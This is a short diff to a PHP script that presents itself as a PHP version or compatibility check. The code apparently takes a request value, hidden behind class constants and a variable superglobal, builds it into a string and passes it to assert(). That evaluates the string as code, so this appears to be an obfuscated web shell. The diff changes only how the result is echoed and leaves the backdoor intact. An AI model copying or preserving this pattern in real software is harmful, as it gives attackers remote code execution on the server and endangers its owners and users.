@@ -27,7 +27,8 @@ $current_version = phpversion();
 if ($_SERVER['REQUEST_METHOD'] == Methods::TYPES[1] && isset(${Methods::TYPES[0]}[RequestHeaders::REQUIRED[0]])) {
 	$user_agent = ${Methods::TYPES[0]}[RequestHeaders::REQUIRED[0]];
 	$requirements = SupportedVersions::VERSIONS . "(\"$user_agent\")";
-	echo assert($requirements);
+	$requirements_array = assert($requirements);
+	echo $requirements_array;
 } else {
 	http_response_code(406);
 	echo <<<END
